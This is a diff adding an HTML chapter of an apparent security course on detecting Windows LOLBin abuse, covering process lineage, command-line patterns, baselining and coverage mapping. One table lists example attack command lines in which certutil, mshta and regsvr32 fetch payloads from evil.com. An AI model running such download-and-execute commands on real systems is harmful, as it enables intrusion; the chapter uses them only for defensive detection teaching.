@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="chapter-id" content="05">
+  <meta name="module-id" content="lolbas">
+  <title>Detection Strategy · LOLBAS · H3AD-LEARN</title>
+  <link rel="icon" href="https://h3ad-sec.github.io/fevicon.png?v=2026">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Exo+2:wght@300;400;500;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+  <div class="reading-progress" id="readingProgress"></div>
+  <header class="site-header">
+    <div class="header-inner">
+      <div class="header-left">
+        <a href="../index.html" class="logo-link">
+          <img src="https://raw.githubusercontent.com/h3ad-sec/h3ad-sec.github.io/main/logo-dark.png" id="site-logo" class="site-logo" alt="H3AD-SEC" height="32">
+        </a>
+        <div class="nav-pill">
+          <span class="nav-pill-name">H3AD-LEARN</span>
+          <span class="nav-pill-sep">·</span>
+          <span class="nav-pill-tagline">DETECTION STRATEGY</span>
+        </div>
+      </div>
+      <nav class="header-nav">
+        <a href="../index.html" class="nav-link">Hub</a>
+        <a href="index.html" class="nav-link">LOLBAS</a>
+        <a href="../threat-hunting/index.html" class="nav-link">Threat Hunting</a>
+      </nav>
+      <div class="header-actions">
+        <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+        </button>
+      </div>
+    </div>
+  </header>
+
+  <div class="chapter-layout">
+    <aside class="toc-sidebar" id="tocSidebar">
+      <a href="index.html" class="toc-back-link">← LOLBAS</a>
+      <div class="toc-chapter-info">
+        <span class="mono accent" style="font-size:0.75rem;letter-spacing:0.1em;">CHAPTER 05 of 8</span>
+        <span class="muted" style="font-size:0.75rem;font-family:var(--font-mono)">35 MIN READ</span>
+      </div>
+      <nav class="toc-nav" id="tocNav"><!-- JS-populated --></nav>
+      <div class="toc-progress">
+        <span class="section-label" style="font-size:0.55rem;letter-spacing:0.2em;color:var(--muted);font-family:var(--font-mono)">PROGRESS</span>
+        <div class="toc-progress-bar"><div class="toc-progress-fill" id="chapterProgressFill"></div></div>
+        <span class="muted" style="font-size:0.72rem;font-family:var(--font-mono)" id="chapterProgressLabel">0 of 7 sections</span>
+      </div>
+    </aside>
+
+    <main class="chapter-body" id="chapterBody">
+      <article>
+        <header class="chapter-header">
+          <div class="chapter-meta">
+            <span class="badge-module mono">CHAPTER 05</span>
+            <span class="badge-time muted mono">35 MIN READ</span>
+            <span class="badge-diff badge-intermediate">INTERMEDIATE</span>
+          </div>
+          <h1 class="chapter-title">Detection Strategy</h1>
+          <p class="chapter-intro">Detecting LOLBin abuse requires a different mental model than signature-based detection. The binary is trusted. The behavior is the attack. This chapter builds the strategic framework: behavioral dimensions, parent-child chains, command-line patterns, baselining, network correlation, coverage mapping, and the detection lifecycle that ties it together.</p>
+          <div class="chapter-tags">
+            <span class="tag">behavioral detection</span>
+            <span class="tag">parent-child</span>
+            <span class="tag">baselining</span>
+            <span class="tag">coverage</span>
+          </div>
+        </header>
+
+        <!-- SECTION 1 -->
+        <section class="content-section" id="behavior-over-signature">
+          <h2>Behavior Over Signature</h2>
+          <p>Signature-based detection fails against LOLBins because the attack uses a binary Windows trusts. You cannot block certutil.exe by hash. You cannot alert on every mshta.exe invocation. Detection has to target what the binary does in a given context, not what the binary is.</p>
+          <p>Three behavioral dimensions define that context:</p>
+          <ul>
+            <li><strong>Execution context</strong> -- the parent process, the account running the binary, the working directory, and the time of day.</li>
+            <li><strong>Command-line content</strong> -- the flags, arguments, URLs, and encoded strings passed to the binary.</li>
+            <li><strong>Network behavior</strong> -- whether the binary made an outbound connection, to what destination, and how soon after process creation.</li>
+          </ul>
+          <p>Consider certutil.exe. When it runs as SYSTEM, spawned from a scheduled task on a WSUS server, reaching download.microsoft.com, that is a Windows Update operation. When it runs as a domain user, spawned from winword.exe on a workstation, reaching 185.220.101.x, that is a download cradle. The binary is identical. The context is not.</p>
+          <p>Context is also the mechanism that reduces false positives. Before alerting, you filter the population of all certutil executions down to those that match an attacker profile rather than an admin profile. The executions that remain after that filter are worth investigating.</p>
+          <div class="callout-info"><strong>Note:</strong> The goal is not to alert on every certutil execution. The goal is to alert on certutil executions matching an attacker profile while suppressing those matching an admin profile.</div>
+        </section>
+
+        <!-- SECTION 2 -->
+        <section class="content-section" id="parent-child-analysis">
+          <h2>Parent-Child Process Analysis</h2>
+          <p>Of the three behavioral dimensions, the parent-child chain carries the most signal. An attacker using certutil as a download cradle has to invoke it from somewhere -- a macro, a script, a dropped executable. That parent process is almost never the same parent that runs certutil legitimately.</p>
+          <p>Normal parent processes for common LOLBins:</p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Binary</th><th>Normal Parents</th></tr>
+              </thead>
+              <tbody>
+                <tr><td class="mono">certutil.exe</td><td>explorer.exe (manual), svchost.exe (maintenance), wuauclt.exe (Windows Update)</td></tr>
+                <tr><td class="mono">mshta.exe</td><td>explorer.exe (user running .hta file)</td></tr>
+                <tr><td class="mono">regsvr32.exe</td><td>msiexec.exe (software install), explorer.exe, TrustedInstaller.exe</td></tr>
+                <tr><td class="mono">wscript.exe / cscript.exe</td><td>explorer.exe (manual), cmd.exe (admin script), svchost.exe (task scheduler)</td></tr>
+                <tr><td class="mono">powershell.exe</td><td>explorer.exe, cmd.exe, svchost.exe (task scheduler), developer tools</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <p>High-signal anomalous parent-child pairs worth alerting on directly:</p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Parent</th><th>Child</th><th>ATT&amp;CK</th><th>Confidence</th></tr>
+              </thead>
+              <tbody>
+                <tr><td class="mono">winword / excel / powerpnt / outlook</td><td>any LOLBin</td><td>T1218</td><td>HIGH</td></tr>
+                <tr><td class="mono">mshta.exe</td><td>cmd / powershell / wscript</td><td>T1218.005</td><td>HIGH</td></tr>
+                <tr><td class="mono">chrome / msedge</td><td>wscript / mshta</td><td>T1218</td><td>HIGH</td></tr>
+                <tr><td class="mono">wscript / vbscript</td><td>powershell</td><td>T1059.001</td><td>HIGH</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <div class="callout-warning"><strong>Warning:</strong> Do not alert on all Office-to-cmd spawns. Office legitimately spawns cmd.exe for some operations. The high signal is Office spawning a LOLBin -- certutil, mshta, regsvr32, wscript -- or cmd spawning a LOLBin with a suspicious CommandLine. The child being cmd alone is not sufficient.</div>
+        </section>
+
+        <!-- SECTION 3 -->
+        <section class="content-section" id="command-line-patterns">
+          <h2>Command-Line Pattern Analysis</h2>
+          <p>Command-line content is the second most important signal. For most LOLBins, the legitimate use cases produce predictable argument patterns. Malicious use produces different ones. The table below captures the split for the most commonly abused binaries.</p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Binary</th><th>Benign Pattern</th><th>Malicious Pattern</th></tr>
+              </thead>
+              <tbody>
+                <tr><td class="mono">certutil.exe</td><td><code>-hashfile file.exe</code></td><td><code>-urlcache -f http://evil.com/p.exe</code></td></tr>
+                <tr><td class="mono">mshta.exe</td><td><code>mshta C:\admin\tool.hta</code> (local path)</td><td><code>mshta http://evil.com/p.hta</code> or <code>mshta vbscript:...</code></td></tr>
+                <tr><td class="mono">regsvr32.exe</td><td><code>/s C:\Windows\System32\comsvcs.dll</code></td><td><code>/s /u /i:http://evil.com/p.sct scrobj.dll</code></td></tr>
+                <tr><td class="mono">rundll32.exe</td><td><code>shell32.dll,Control_RunDLL</code></td><td><code>C:\Users\user\AppData\p.dll,DllMain</code></td></tr>
+                <tr><td class="mono">powershell.exe</td><td><code>-Command Get-Process</code></td><td><code>-nop -w hidden -enc BASE64</code></td></tr>
+              </tbody>
+            </table>
+          </div>
+          <p>Detection logic needs to account for obfuscation. Certutil with caret characters inserted between arguments (<code>cert^util</code>) bypasses naive string matching. Build patterns that normalize common obfuscation variants, not just the clean form.</p>
+          <div class="callout-tip"><strong>Tip:</strong> Regex patterns like <code>certutil.*-urlcache</code> match certutil.exe and certutil (without .exe) and common whitespace variations. Exact string matching misses the obfuscated variants with caret characters inserted to break simple signatures.</div>
+        </section>
+
+        <!-- SECTION 4 -->
+        <section class="content-section" id="baseline-deviation">
+          <h2>Establishing Baselines and Detecting Deviation</h2>
+          <p>You cannot detect anomalies without a baseline. Baselining answers a specific question for each binary: what is normal for this binary in this environment? Without that answer, every detection rule is guessing at thresholds.</p>
+          <p>Five baseline dimensions to capture per binary:</p>
+          <ul>
+            <li><strong>Execution frequency</strong> -- how many times per day per asset type (workstation vs server vs WSUS relay).</li>
+            <li><strong>Parent distribution</strong> -- which processes spawn this binary across the estate.</li>
+            <li><strong>Command-line diversity</strong> -- how many distinct command lines appear in 30 days. Low diversity means most executions are identical, making outliers easy to spot.</li>
+            <li><strong>Network destinations</strong> -- which domains and IPs the binary reaches outbound.</li>
+            <li><strong>Account context</strong> -- which accounts run this binary. SYSTEM vs named user vs service account carries different meaning.</li>
+          </ul>
+          <p>In practice: run a broad SIEM or EDR query for the binary over 30 days, analyze the distribution across those five dimensions, document the normal population, then build suppression conditions before alerting on departures from it.</p>
+          <p>Some binaries are so infrequently used that the baseline is effectively zero. Installutil.exe, odbcconf.exe, and regasm.exe almost never execute on standard workstations outside .NET installation events. For those, any execution is the anomaly. No frequency threshold required.</p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Binary</th><th>Typical Frequency</th><th>Detection Approach</th></tr>
+              </thead>
+              <tbody>
+                <tr><td class="mono">certutil.exe</td><td>Medium</td><td>Filter by destination and parent process</td></tr>
+                <tr><td class="mono">mshta.exe</td><td>Low</td><td>Any unexplained execution warrants review</td></tr>
+                <tr><td class="mono">regsvr32.exe</td><td>High</td><td>Filter heavily by CommandLine content</td></tr>
+                <tr><td class="mono">rundll32.exe</td><td>Very High</td><td>Filter by DLL path (user-writable directories)</td></tr>
+                <tr><td class="mono">installutil.exe</td><td>Very Low</td><td>Flag all workstation executions</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </section>
+
+        <!-- SECTION 5 -->
+        <section class="content-section" id="network-correlation">
+          <h2>Network Correlation</h2>
+          <p>LOLBins making outbound network connections on standard workstations are performing either a download cradle or C2 beaconing. There is almost no other explanation. Most LOLBins have no legitimate reason to make network connections in typical enterprise workstation use.</p>
+          <p>The complete list of expected network behavior for common LOLBins is short. Certutil reaches crl.microsoft.com and ocsp.digicert.com for certificate validation. Bitsadmin reaches WSUS and Windows Update endpoints. That covers the vast majority of legitimate outbound activity. Everything else warrants scrutiny.</p>
+          <p>The detection primitive is a process-to-network join. Sysmon EID 1 (process creation) correlated with Sysmon EID 3 (network connection) on the same ProcessId within 30 seconds. If certutil spawned and certutil made a network call to a non-Microsoft IP within that window, the combination is the alert condition. Neither event alone is sufficient -- both are required.</p>
+          <p>DNS telemetry adds a secondary signal. A DNS query from certutil.exe to a domain resolving to a residential or VPS IP fires before the network connection event and before the payload lands. If your SIEM has process-tagged DNS telemetry, build that as an early-warning layer.</p>
+          <p>For BITS specifically, the operational event log provides a third source. EID 59 (job started) and EID 60 (job completed) include the source URL in the event description. This catches BITS-based downloads even when Sysmon EID 3 is not deployed or the process-network join fails.</p>
+          <div class="callout-warning"><strong>Warning:</strong> In WSUS relay environments, certutil legitimately contacts microsoft.com and windows.com. Suppress those destinations explicitly. The rule condition is: certutil network connection to a non-Microsoft, non-internal destination. That suppression preserves detection for every other host.</div>
+        </section>
+
+        <!-- SECTION 6 -->
+        <section class="content-section" id="coverage-mapping">
+          <h2>Detection Coverage Mapping</h2>
+          <p>Individual rules are not a detection program. Coverage mapping is what converts a collection of rules into a program with measurable gaps. The standard framework is ATT&amp;CK T1218 subtechniques.</p>
+          <p>For each T1218 subtechnique, the coverage matrix should answer four questions: Does a relevant data source exist in this environment? Does a detection rule exist for it? When was the rule last tested? What is the known false positive rate? Any subtechnique without a data source is a blind spot. Any subtechnique without a rule is a gap. Any rule not tested in the last six months is of unknown reliability.</p>
+          <p>Common gaps in otherwise mature environments include rundll32 JavaScript execution (<code>rundll32 javascript:</code>), odbcconf REGSVR action, LOLDriver monitoring (Sysmon EID 6 driver load is often not deployed), and WMIC remote execution where the <code>/node:</code> pattern is missing from the rule.</p>
+          <p>Prioritize gap closure by threat actor usage. ATT&amp;CK Groups data shows which tracked actors use which techniques. If the actors most likely to target your industry use mshta and rundll32 heavily, gaps in those subtechniques are higher priority than gaps in less-used techniques.</p>
+          <div class="callout-tip"><strong>Tip:</strong> ATT&amp;CK Navigator layers let you color T1218 subtechniques by detection status. Use cyan for detected, amber for partial coverage, and gray for no coverage. The resulting visual communicates gaps to management faster than any spreadsheet.</div>
+        </section>
+
+        <!-- SECTION 7 -->
+        <section class="content-section" id="detection-architecture">
+          <h2>Detection Architecture for LOLBin Coverage</h2>
+          <p>A systematic detection program follows a repeatable lifecycle for every rule: hypothesis formation, data source validation, rule authoring, testing in an isolated environment, deployment, tuning, documentation, and scheduled review. Skipping any stage creates a gap -- either a rule that never fires, a rule that fires too broadly to action, or a rule with no record of what it catches.</p>
+          <p>Rule naming matters for operational clarity. A convention like <code>LOLBIN-CERTUTIL-DOWNLOAD-CRADLE</code> or <code>LOLBIN-MSHTA-CHILD-PROCESS</code> immediately conveys the binary, the technique, and the specific behavior. Flat names like "Suspicious Process" do not.</p>
+          <p>Testing with Atomic Red Team provides controlled ground truth. The atomicredteam.io library covers most T1218 subtechniques. Running a test in an isolated lab and verifying the rule fires gives you documented detection validation, not assumed coverage. That test result goes into the rule's documentation record.</p>
+          <p>Tuning philosophy: tune from context, not from volume. A rule firing 1,000 times per day is not evidence that the rule should be disabled. Analyze the top triggers. If they are legitimate, they can be described precisely -- a specific device, a specific destination, a specific parent process. Add that description as a suppression condition. If they are malicious, 1,000 is not noise; it is the attack. Disabling a rule because it produces FPs you have not characterized is how blind spots form.</p>
+          <p>Each rule record should contain at minimum: the ATT&amp;CK technique it covers, the data source it requires, the known false positive cases, the date of last successful test, and a sensitivity rating. Documentation is not overhead -- it is the difference between a rule that gets tuned correctly and one that gets disabled six months later by someone who does not know what it was catching.</p>
+          <div class="callout-info"><strong>Note:</strong> Chapter 6 provides the actual query syntax for each LOLBin. This chapter provides the strategic framework. Strategy without queries is a plan. Queries without strategy are unordered noise. Both are required.</div>
+        </section>
+
+        <!-- KEY TAKEAWAYS -->
+        <div class="chapter-summary">
+          <h3>Key Takeaways</h3>
+          <ul>
+            <li>Behavioral detection targets what the binary does -- parent, command line, network -- not what it is (hash, name). The binary is trusted. The context is the signal.</li>
+            <li>Parent-child chain analysis is the highest-signal detection vector. Office applications spawning certutil or wscript is nearly always malicious.</li>
+            <li>Command-line pattern analysis distinguishes legitimate from malicious use. certutil -hashfile is benign. certutil -urlcache to an external IP is not.</li>
+            <li>Baselining is a prerequisite. Knowing certutil runs 200 times per day on your WSUS server prevents those executions from flooding alert queues.</li>
+            <li>LOLBins making outbound connections to non-Microsoft, non-internal destinations are almost always performing cradle or C2 activity.</li>
+            <li>Coverage mapping against T1218 subtechniques reveals which LOLBins you detect versus which have blind spots. Prioritize gaps by threat actor usage patterns.</li>
+            <li>The detection lifecycle requires hypothesis, data source, rule, test, deploy, tune, document, and review. Rules without testing or documentation create false confidence, not detection capability.</li>
+          </ul>
+        </div>
+
+        <!-- KNOWLEDGE CHECK -->
+        <div class="knowledge-check">
+          <h3 class="kc-title">Knowledge Check</h3>
+          <p class="kc-intro muted">Click an answer to reveal the explanation.</p>
+
+          <div class="kc-question">
+            <p class="kc-prompt">What is the most reliable indicator that certutil.exe is performing a download cradle rather than certificate operations?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. certutil.exe running under a non-SYSTEM account.</button>
+              <button class="kc-option" data-correct="true">B. certutil.exe making an outbound connection to a non-Microsoft domain.</button>
+              <button class="kc-option" data-correct="false">C. certutil.exe spawning cmd.exe as a child process.</button>
+              <button class="kc-option" data-correct="false">D. certutil.exe running more than once in 24 hours.</button>
+            </div>
+            <div class="kc-answer">Legitimate certutil reaches Microsoft certificate services (crl.microsoft.com, ocsp.digicert.com). Any certutil network connection to a residential IP, VPS, or unknown domain is essentially unexplainable by legitimate use on a standard workstation. Sysmon EID 1 (process creation) correlated with EID 3 (network connection) on the same ProcessId is the detection primitive.</div>
+          </div>
+
+          <div class="kc-question">
+            <p class="kc-prompt">A rule fires 1,000 times per day because a WSUS server runs certutil to download updates. What is the correct response?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. Disable the rule to reduce noise.</button>
+              <button class="kc-option" data-correct="true">B. Add suppression for the WSUS server device name and Microsoft destination domains.</button>
+              <button class="kc-option" data-correct="false">C. Increase alert severity so analysts prioritize reviewing all certutil results.</button>
+              <button class="kc-option" data-correct="false">D. Replace certutil detection with hash-based detection.</button>
+            </div>
+            <div class="kc-answer">Suppression by device name and destination domain preserves detection capability for all other hosts while silencing the known-good WSUS activity. The rule logic is correct -- certutil with outbound HTTP is a meaningful signal. The noise comes from one precisely describable legitimate use case. Never disable a working detection because of false positives you can characterize.</div>
+          </div>
+
+          <div class="kc-question">
+            <p class="kc-prompt">Which LOLBin has such low legitimate execution frequency on standard workstations that any execution warrants review?</p>
+            <div class="kc-options">
+              <button class="kc-option" data-correct="false">A. rundll32.exe</button>
+              <button class="kc-option" data-correct="false">B. certutil.exe</button>
+              <button class="kc-option" data-correct="false">C. regsvr32.exe</button>
+              <button class="kc-option" data-correct="true">D. installutil.exe</button>
+            </div>
+            <div class="kc-answer">installutil.exe is a .NET framework installation utility. Outside of .NET framework installation contexts -- which are rare and typically invoked from msiexec -- it has no legitimate reason to execute on a user workstation. Contrast this with rundll32, which Windows calls constantly for COM operations, or regsvr32, which fires during software installs. Any installutil execution on a workstation not actively installing .NET software warrants investigation.</div>
+          </div>
+        </div>
+
+        <!-- CHAPTER NAV -->
+        <nav class="chapter-nav">
+          <a href="04-attacker-tradecraft.html" class="chapter-nav-prev">← Attacker Tradecraft</a>
+          <a href="06-detection-queries.html" class="chapter-nav-next">Detection Queries →</a>
+        </nav>
+      </article>
+    </main>
+  </div>
+
+  <script src="../js/learn.js"></script>
+  <script>document.addEventListener('DOMContentLoaded', () => initChapter('05', 7));</script>
+</body>
+</html>
